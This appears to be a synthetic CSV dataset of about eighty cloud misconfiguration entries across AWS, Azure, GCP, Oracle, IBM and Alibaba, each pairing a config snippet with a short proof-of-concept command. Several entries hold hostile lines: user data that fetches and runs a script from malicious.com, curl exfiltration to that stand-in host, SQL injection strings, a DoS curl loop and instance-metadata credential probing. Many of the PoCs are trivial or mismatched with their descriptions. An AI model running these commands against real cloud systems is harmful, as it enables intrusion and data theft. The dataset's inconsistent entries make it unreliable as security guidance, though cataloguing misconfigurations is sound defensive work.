id,description,category,cloud_provider,vulnerable_code,poc,source,timestamp
VUL895,IBM Cloud Functions with misconfigured trigger allowing unauthorized invocation.,Access Control,IBM Cloud,"{ ""triggerConfig"": { ""access"": ""public"" } }",ibmcloud fn trigger fire trigger-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:44:00Z
VUL896,Alibaba Cloud OSS with misconfigured CORS allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""CORSConfiguration"": { ""AllowedOrigins"": [""*""], ""AllowedMethods"": [""GET"", ""PUT""] } }",curl -H 'Origin: http://malicious.com' https://oss.bucket/file.txt,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:44:00Z
VUL897,AWS API Gateway with misconfigured throttling allowing DoS attacks.,Denial of Service,AWS,"{ ""throttlingConfig"": { ""rateLimit"": 10000 } }",for i in {1..10000}; do curl https://api-id.execute-api.region.amazonaws.com/stage; done,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:44:00Z
VUL898,Azure App Service with misconfigured authentication allowing session hijacking.,Session Management,Azure,"{ ""authSettings"": { ""sessionTimeout"": 0 } }",curl https://app-service.azurewebsites.net --cookie 'session=123',"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/app-service'}",2025-06-19T11:44:00Z
VUL899,GCP Cloud Storage with misconfigured bucket policy allowing data exposure.,Data Exposure,GCP,gsutil iam ch allUsers:objectViewer gs://bucket,gsutil cat gs://bucket/sensitive.txt,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:44:00Z
VUL900,Oracle Cloud Database with misconfigured encryption key exposing data.,Encryption,Oracle Cloud,"{ ""encryptionConfig"": { ""key"": ""weak-key"" } }",oci db database get --database-id db-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/managingDBsystem.htm'}",2025-06-19T11:44:00Z
VUL901,AWS ECS with misconfigured network mode allowing container-to-host communication.,Network Security,AWS,"{ ""taskDefinition"": { ""networkMode"": ""host"" } }",docker exec container-id curl http://localhost:22,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/ecs'}",2025-06-19T11:56:00Z
VUL902,Azure Function with misconfigured HTTP trigger allowing SQL injection.,Injection,Azure,"{ ""bindings"": [{ ""type"": ""httpTrigger"", ""authLevel"": ""anonymous"", ""route"": ""user/{id}"" }] }",curl https://function-app.azurewebsites.net/api/user/1%27%20OR%201=1--,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-functions'}",2025-06-19T11:56:00Z
VUL903,GCP Cloud Run with misconfigured memory limit allowing DoS attacks.,Denial of Service,GCP,gcloud run deploy service --image image --memory=8Gi,curl https://service-region.run.app?consume=8GB,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:56:00Z
VUL904,Oracle Cloud Compute with misconfigured security list allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""securityList"": { ""ingressRules"": [{ ""source"": ""0.0.0.0/0"", ""protocol"": ""all"" }] } }",nmap -p- instance-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:56:00Z
VUL905,IBM Cloud Object Storage with misconfigured CORS policy allowing data exfiltration.,Data Exfiltration,IBM Cloud,"{ ""corsConfiguration"": { ""allowedOrigins"": [""*""], ""allowedMethods"": [""GET"", ""PUT""] } }",curl -H 'Origin: http://malicious.com' https://s3.bucket/file.txt,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/cloud-object-storage'}",2025-06-19T11:56:00Z
VUL906,Alibaba Cloud SLB with misconfigured backend server exposing internal services.,Data Exposure,Alibaba Cloud,"{ ""BackendServerList"": [{ ""ServerId"": ""internal-ecs"", ""Weight"": 100 }] }",curl https://slb-ip/internal-service,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/27595.htm'}",2025-06-19T11:56:00Z
VUL907,AWS S3 bucket with misconfigured object lock allowing data tampering.,Data Exposure,AWS,"{ ""ObjectLockConfiguration"": { ""ObjectLockEnabled"": ""Disabled"" } }",aws s3 cp malicious.txt s3://bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:56:00Z
VUL908,Azure SQL Database with misconfigured TDE exposing data.,Encryption,Azure,"{ ""transparentDataEncryption"": { ""status"": ""Disabled"" } }",sqlcmd -S sql-server.database.windows.net -U user -P pass -Q 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-sql'}",2025-06-19T11:56:00Z
VUL909,GCP Cloud Functions with misconfigured environment variable exposing secrets.,Data Exposure,GCP,gcloud functions deploy fn --set-env-vars SECRET=plain-text-key,gcloud functions describe fn --format='value(envVariables)',"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:56:00Z
VUL910,Oracle Cloud VCN with misconfigured service gateway allowing data exfiltration.,Data Exfiltration,Oracle Cloud,"{ ""serviceGatewayRules"": [{ ""destination"": ""all-services"", ""protocol"": ""all"" }] }",curl http://malicious.com --interface vcn-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:56:00Z
VUL911,IBM Cloud Kubernetes with misconfigured RBAC policy allowing privilege escalation.,Privilege Escalation,IBM Cloud,"{ ""roleBinding"": { ""roleRef"": ""cluster-admin"", ""subjects"": [{ ""kind"": ""User"", ""name"": ""*"" }] } }",kubectl get secrets --all-namespaces,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:56:00Z
VUL912,Alibaba Cloud RDS with misconfigured binary logging exposing data.,Data Exposure,Alibaba Cloud,"{ ""BinlogConfig"": { ""enabled"": true, ""publicAccess"": true } }",mysql -h rds-endpoint -u user -p -e 'SHOW BINARY LOGS',"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:56:00Z
VUL913,AWS API Gateway with misconfigured authorizer allowing unauthorized access.,Authentication,AWS,"{ ""authorizerConfig"": { ""type"": ""NONE"" } }",curl https://api-id.execute-api.region.amazonaws.com/stage,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:56:00Z
VUL914,Azure Cosmos DB with misconfigured partition key exposing data.,Data Exposure,Azure,"{ ""partitionKey"": { ""paths"": [""/public_field""] } }",curl https://cosmosdb-account.documents.azure.com/dbs/db/colls/coll/docs?partitionKey=public_field,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cosmos-db'}",2025-06-19T11:56:00Z
VUL915,GCP Cloud Storage with misconfigured bucket notification allowing data exfiltration.,Data Exfiltration,GCP,gsutil notification create -t topic -f json gs://bucket,gsutil cp trigger.txt gs://bucket,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:56:00Z
VUL916,Oracle Cloud Database with misconfigured listener exposing sensitive data.,Data Exposure,Oracle Cloud,"{ ""listenerConfig"": { ""publicAccess"": true } }",sqlplus user/pass@db-endpoint:1521/service -e 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/managingDBsystem.htm'}",2025-06-19T11:56:00Z
VUL917,IBM Cloud Functions with misconfigured action policy allowing unauthorized invocation.,Access Control,IBM Cloud,"{ ""actionPolicy"": { ""access"": ""public"" } }",ibmcloud fn action invoke action-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:56:00Z
VUL918,Alibaba Cloud OSS with misconfigured bucket tag allowing unauthorized access.,Access Control,Alibaba Cloud,"{ ""Tagging"": { ""TagSet"": [{ ""Key"": ""access"", ""Value"": ""public"" }] } }",aliyun oss ls oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL919,AWS CloudTrail with misconfigured event selector exposing sensitive logs.,Data Exposure,AWS,"{ ""eventSelectors"": [{ ""readWriteType"": ""All"", ""includeManagementEvents"": true }] }",aws cloudtrail get-event-selectors --trail-name trail,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/awscloudtrail'}",2025-06-19T11:56:00Z
VUL920,Azure Virtual Machine with misconfigured NSG rule allowing lateral movement.,Network Security,Azure,"{ ""securityRules"": [{ ""sourceAddressPrefix"": ""*"", ""destinationPortRange"": ""*"" }] }",nmap -p- vm-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:56:00Z
VUL921,GCP Cloud Functions with misconfigured timeout allowing resource exhaustion.,Denial of Service,GCP,gcloud functions deploy fn --timeout=3600s,curl https://us-central1-project.cloudfunctions.net/fn?delay=3600,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:56:00Z
VUL922,Oracle Cloud Load Balancer with misconfigured SSL policy allowing weak ciphers.,Encryption,Oracle Cloud,"{ ""sslConfig"": { ""cipherSuites"": [""TLS_RSA_WITH_3DES_EDE_CBC_SHA""] } }",nmap --script ssl-enum-ciphers -p 443 lb-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:56:00Z
VUL923,IBM Cloud VPC with misconfigured VPN policy allowing weak encryption.,Encryption,IBM Cloud,"{ ""vpnPolicy"": { ""encryption"": ""DES"" } }",nmap --script ssl-enum-ciphers -p 500 vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:56:00Z
VUL924,Alibaba Cloud ECS with misconfigured user data allowing command injection.,Code Injection,Alibaba Cloud,"{ ""UserData"": ""#!/bin/bash
$(curl http://malicious.com/script.sh)"" }",aliyun ecs DescribeInstanceAttribute --InstanceId instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:56:00Z
VUL925,AWS EKS with misconfigured pod security policy allowing privilege escalation.,Privilege Escalation,AWS,"{ ""podSecurityPolicy"": { ""runAsUser"": { ""rule"": ""RunAsAny"" } } }",kubectl exec pod -- /bin/sh -c 'whoami',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:56:00Z
VUL926,Azure API Management with misconfigured CORS policy allowing data exfiltration.,Data Exfiltration,Azure,"{ ""corsPolicy"": { ""allowedOrigins"": [""*""], ""allowCredentials"": true } }",curl -H 'Origin: http://malicious.com' https://api-management.azure-api.net,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:56:00Z
VUL927,GCP Cloud SQL with misconfigured SSL requirement exposing data.,Encryption,GCP,gcloud sql instances create instance --no-require-ssl,mysql -h sql-ip -u user -p --ssl-mode=DISABLED,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:56:00Z
VUL928,Oracle Cloud Identity with misconfigured authentication policy allowing weak passwords.,Authentication,Oracle Cloud,"{ ""authPolicy"": { ""passwordStrength"": ""low"" } }",oci iam user login --user-id user-id --password weak123,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:56:00Z
VUL929,IBM Cloud Functions with misconfigured environment exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""env"": { ""API_KEY"": ""plain-text-key"" } }",ibmcloud fn action get action-name --show-env,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:56:00Z
VUL930,Alibaba Cloud OSS with misconfigured bucket lifecycle policy exposing data.,Data Exposure,Alibaba Cloud,"{ ""LifecycleRule"": { ""Expiration"": { ""Days"": 1 }, ""Status"": ""Enabled"" } }",aliyun oss ls oss://bucket/expired-file,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL931,AWS SNS with misconfigured topic policy allowing unauthorized publishing.,Access Control,AWS,"{ ""TopicPolicy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""sns:Publish"" }] } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'test',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:56:00Z
VUL932,Azure Event Hub with misconfigured partition access allowing data leakage.,Data Exposure,Azure,"{ ""partitionConfig"": { ""access"": ""public"" } }",curl https://eventhub-namespace.servicebus.windows.net/hub/partition,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/event-hubs'}",2025-06-19T11:56:00Z
VUL933,GCP BigQuery with misconfigured table access allowing unauthorized queries.,Access Control,GCP,"bq update --set_iam_policy '{""bindings"": [{""role"": ""roles/bigquery.dataViewer"", ""members"": [""allUsers""]}]}' dataset.table",bq query 'SELECT * FROM dataset.table',"{'cve': 'N/A', 'link': 'https://cloud.google.com/bigquery/docs'}",2025-06-19T11:56:00Z
VUL934,Oracle Cloud Object Storage with misconfigured bucket policy allowing data exposure.,Data Exposure,Oracle Cloud,"{ ""bucketPolicy"": { ""Statement"": [{ ""Action"": ""GetObject"", ""Principal"": ""*"" }] } }",oci os object get --bucket-name bucket --name file.txt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Object/Tasks/managingbuckets.htm'}",2025-06-19T11:56:00Z
VUL935,IBM Cloud Kubernetes with misconfigured readiness probe allowing DoS attacks.,Denial of Service,IBM Cloud,"{ ""readinessProbe"": { ""timeoutSeconds"": 1 } }",kubectl describe pod pod-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:56:00Z
VUL936,Alibaba Cloud ECS with misconfigured IAM role allowing privilege escalation.,Privilege Escalation,Alibaba Cloud,"{ ""InstanceRole"": { ""permissions"": ""admin"" } }",aliyun ecs DescribeInstanceAttribute --InstanceId instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:56:00Z
VUL937,AWS CloudFormation with misconfigured template exposing sensitive parameters.,Data Exposure,AWS,"{ ""Parameters"": { ""DbPassword"": { ""Type"": ""String"", ""Default"": ""plain-text-pass"" } } }",aws cloudformation describe-stacks --stack-name stack,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/cloudformation'}",2025-06-19T11:56:00Z
VUL938,Azure Machine Learning with misconfigured dataset access allowing data leakage.,Data Exposure,Azure,"{ ""datasetConfig"": { ""access"": ""public"" } }",curl https://ml-workspace.region.api.azureml.ms/datasets/data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/machine-learning'}",2025-06-19T11:56:00Z
VUL939,GCP Cloud Monitoring with misconfigured alert policy exposing sensitive data.,Data Exposure,GCP,gcloud monitoring policies create --notification-channels='public-channel',curl https://public-channel/,"{'cve': 'N/A', 'link': 'https://cloud.google.com/monitoring/docs'}",2025-06-19T11:56:00Z
VUL940,Oracle Cloud Functions with misconfigured trigger policy allowing unauthorized invocation.,Access Control,Oracle Cloud,"{ ""triggerPolicy"": { ""access"": ""public"" } }",oci fn function invoke --function-id fn-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Functions/Tasks/functions.htm'}",2025-06-19T11:56:00Z
VUL941,IBM Cloud VPC with misconfigured network ACL allowing lateral movement.,Network Security,IBM Cloud,"{ ""networkAclRules"": [{ ""source"": ""0.0.0.0/0"", ""action"": ""allow"" }] }",nmap -p- vpc-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:56:00Z
VUL942,Alibaba Cloud RDS with misconfigured encryption policy exposing data.,Encryption,Alibaba Cloud,"{ ""EncryptionConfig"": { ""enabled"": false } }",aliyun rds DescribeDBInstanceAttribute --DBInstanceId db-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:56:00Z
VUL943,AWS Redshift with misconfigured snapshot policy exposing data.,Data Exposure,AWS,"{ ""snapshotConfig"": { ""publicAccess"": true } }",aws redshift describe-cluster-snapshots --cluster-identifier cluster,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/redshift'}",2025-06-19T11:56:00Z
VUL944,Azure Data Lake with misconfigured storage account access allowing data exfiltration.,Data Exfiltration,Azure,"{ ""storageAccountAccess"": { ""permissions"": [{ ""principal"": ""*"", ""access"": ""read"" }] } }",az storage blob download --account-name datalake --container-name container --name file.txt,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/data-lake-store'}",2025-06-19T11:56:00Z
VUL945,GCP Cloud Composer with misconfigured web server access allowing unauthorized access.,Access Control,GCP,gcloud composer environments create env --web-server-allow-all,curl https://airflow-ui.composer.region.cloud.google.com,"{'cve': 'N/A', 'link': 'https://cloud.google.com/composer/docs'}",2025-06-19T11:56:00Z
VUL946,Oracle Cloud VCN with misconfigured internet gateway allowing data exfiltration.,Data Exfiltration,Oracle Cloud,"{ ""internetGatewayRules"": [{ ""destination"": ""0.0.0.0/0"", ""protocol"": ""all"" }] }",curl http://malicious.com --interface vcn-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:56:00Z
VUL947,IBM Cloud Kubernetes with misconfigured node selector allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""nodeSelector"": { ""cpu"": ""high"" } }",kubectl create pod --image=busybox --requests='cpu=1000',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:56:00Z
VUL948,Alibaba Cloud OSS with misconfigured bucket access log exposing request metadata.,Data Exposure,Alibaba Cloud,"{ ""LoggingEnabled"": { ""TargetBucket"": ""public-bucket"" } }",aliyun oss ls oss://public-bucket/logs,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL949,AWS S3 bucket with misconfigured versioning policy allowing data exposure.,Data Exposure,AWS,"{ ""VersioningConfiguration"": { ""Status"": ""Enabled"" } }",aws s3api list-object-versions --bucket bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:56:00Z
VUL950,Azure Stream Analytics with misconfigured input allowing data leakage.,Data Exposure,Azure,"{ ""inputConfig"": { ""type"": ""EventHub"", ""access"": ""public"" } }",curl https://eventhub-namespace.servicebus.windows.net/hub,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/stream-analytics'}",2025-06-19T11:56:00Z
VUL951,GCP Cloud Armor with misconfigured SQL injection protection allowing attacks.,Injection,GCP,gcloud compute security-policies create policy --no-sql-injection-protection,curl https://backend-service-ip?input=1%27%20OR%201=1--,"{'cve': 'N/A', 'link': 'https://cloud.google.com/armor/docs'}",2025-06-19T11:56:00Z
VUL952,Oracle Cloud File Storage with misconfigured snapshot retention exposing data.,Data Exposure,Oracle Cloud,"{ ""snapshotRetention"": { ""days"": 365 } }",oci fs snapshot list --file-system-id fs-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:56:00Z
VUL953,IBM Cloud Databases with misconfigured SSL exposing data.,Encryption,IBM Cloud,"{ ""sslConfig"": { ""enabled"": false } }",psql -h db-endpoint -U user -d db --no-ssl,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:56:00Z
VUL954,Alibaba Cloud ECS with misconfigured network interface allowing traffic interception.,Network Security,Alibaba Cloud,"{ ""NetworkInterfaceConfig"": { ""publicIp"": true } }",tcpdump -i eth0 host ecs-ip,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25367.htm'}",2025-06-19T11:56:00Z
VUL955,AWS ElastiCache with misconfigured cluster access allowing unauthorized connections.,Access Control,AWS,"{ ""CacheClusterSecurityGroups"": [] }",redis-cli -h elasticache-endpoint -p 6379,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/elasticache'}",2025-06-19T11:56:00Z
VUL956,Azure Databricks with misconfigured cluster policy allowing privilege escalation.,Privilege Escalation,Azure,"{ ""clusterPolicy"": { ""permissions"": ""admin"" } }",curl https://databricks-workspace.azuredatabricks.net/api/2.0/clusters/list,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/databricks'}",2025-06-19T11:56:00Z
VUL957,GCP Cloud VPN with misconfigured IKE version allowing weak encryption.,Encryption,GCP,gcloud compute vpn-tunnels create tunnel --ike-version=1,nmap --script ssl-enum-ciphers -p 500 vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.google.com/vpn/docs'}",2025-06-19T11:56:00Z
VUL958,Oracle Cloud Compute with misconfigured instance metadata exposing credentials.,Data Exposure,Oracle Cloud,"{ ""metadataOptions"": { ""httpTokens"": ""optional"" } }",curl http://169.254.169.254/opc/v1/instance/metadata,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:56:00Z
VUL959,IBM Cloud Functions with misconfigured logging policy exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""loggingPolicy"": { ""destination"": ""public-bucket"" } }",curl https://s3.bucket/function-logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:56:00Z
VUL960,Alibaba Cloud OSS with misconfigured bucket policy allowing data tampering.,Data Exposure,Alibaba Cloud,"{ ""BucketPolicy"": { ""Statement"": [{ ""Action"": ""oss:PutObject"", ""Principal"": ""*"" }] } }",aliyun oss cp malicious.txt oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:56:00Z
VUL961,AWS CodeBuild with misconfigured environment variable exposing secrets.,Data Exposure,AWS,"{ ""environmentVariables"": [{ ""name"": ""API_KEY"", ""value"": ""plain-text-key"" }] }",aws codebuild describe-builds --build-ids build-id,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/codebuild'}",2025-06-19T11:56:00Z
VUL962,Azure Cognitive Services with misconfigured endpoint allowing unauthorized access.,Access Control,Azure,"{ ""endpointConfig"": { ""authentication"": ""none"" } }",curl https://cognitive-endpoint.api.cognitive.microsoft.com/data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cognitive-services'}",2025-06-19T11:56:00Z
VUL963,GCP Cloud Spanner with misconfigured IAM policy allowing unauthorized access.,Access Control,GCP,gcloud spanner databases add-iam-policy-binding db --member='allUsers' --role='roles/spanner.viewer',gcloud spanner databases execute-sql --sql='SELECT * FROM table',"{'cve': 'N/A', 'link': 'https://cloud.google.com/spanner/docs'}",2025-06-19T11:56:00Z
VUL964,Oracle Cloud API Gateway with misconfigured rate limiting allowing DoS attacks.,Denial of Service,Oracle Cloud,"{ ""rateLimitConfig"": { ""requestsPerSecond"": 10000 } }",for i in {1..10000}; do curl https://api-gateway-endpoint; done,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/APIGateway/Tasks/apigateway.htm'}",2025-06-19T11:56:00Z
VUL965,IBM Cloud Security Group with misconfigured ingress rule allowing unauthorized access.,Access Control,IBM Cloud,"{ ""securityGroupRules"": [{ ""source"": ""0.0.0.0/0"", ""direction"": ""ingress"" }] }",nmap -p- sg-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:56:00Z
VUL966,Alibaba Cloud ECS with misconfigured disk encryption exposing data.,Encryption,Alibaba Cloud,"{ ""DiskEncryptionConfig"": { ""enabled"": false } }",aliyun ecs DescribeDisks --InstanceId instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25535.htm'}",2025-06-19T11:56:00Z
VUL967,AWS S3 bucket with misconfigured event trigger allowing unauthorized actions.,Access Control,AWS,"{ ""LambdaFunctionConfigurations"": [{ ""LambdaFunctionArn"": ""arn:aws:lambda:region:account:function:public-fn"" }] }",aws s3 cp trigger.txt s3://bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:56:00Z
VUL968,Azure Virtual Network with misconfigured subnet delegation allowing privilege escalation.,Privilege Escalation,Azure,"{ ""subnetDelegation"": { ""serviceName"": ""Microsoft.ContainerInstance/containerGroups"" } }",az network vnet subnet update --vnet-name vnet --name subnet --delegations Microsoft.ContainerInstance/containerGroups,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-network'}",2025-06-19T11:56:00Z
VUL969,GCP Cloud DNS with misconfigured DNSSEC exposing domain data.,Data Exposure,GCP,gcloud dns managed-zones create zone --dns-name=example.com --dnssec-state=off,dig @dns-ip example.com ANY,"{'cve': 'N/A', 'link': 'https://cloud.google.com/dns/docs'}",2025-06-19T11:56:00Z
VUL970,Oracle Cloud Identity with misconfigured role policy allowing privilege escalation.,Privilege Escalation,Oracle Cloud,"{ ""rolePolicy"": { ""Statement"": [{ ""Action"": ""manage"", ""Resource"": ""*"" }] } }",oci iam role list --user-id user-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:56:00Z
VUL971,IBM Cloud VPC with misconfigured endpoint gateway allowing unauthorized access.,Access Control,IBM Cloud,"{ ""endpointGatewayConfig"": { ""publicAccess"": true } }",curl https://endpoint-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:56:00Z
VUL972,Alibaba Cloud RDS with misconfigured audit policy exposing sensitive queries.,Data Exposure,Alibaba Cloud,"{ ""auditPolicy"": { ""destination"": ""public-bucket"" } }",aliyun oss ls oss://public-bucket/audit-logs,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:56:00Z
VUL973,AWS SNS with misconfigured subscription policy allowing data exfiltration.,Data Exfiltration,AWS,"{ ""SubscriptionPolicy"": { ""Endpoint"": ""http://malicious.com"" } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'sensitive-data',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:56:00Z
VUL974,Azure Virtual Machine with misconfigured boot diagnostics exposing sensitive data.,Data Exposure,Azure,"{ ""bootDiagnostics"": { ""storageUri"": ""public-storage"" } }",curl https://storage-account.blob.core.windows.net/container/boot-diagnostics,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:56:00Z
VUL975,GCP Cloud SQL with misconfigured database flag allowing privilege escalation.,Privilege Escalation,GCP,gcloud sql instances create instance --database-flags 'skip_grant_tables=on',mysql -h sql-ip -u user -p -e 'GRANT ALL PRIVILEGES ON *.* TO user',"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:56:00Z
VUL976,Oracle Cloud File Storage with misconfigured NFS export allowing data exposure.,Data Exposure,Oracle Cloud,"{ ""nfsExportOptions"": { ""source"": ""0.0.0.0/0"", ""access"": ""readOnly"" } }",mount -t nfs fs-endpoint:/export /mnt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:56:00Z
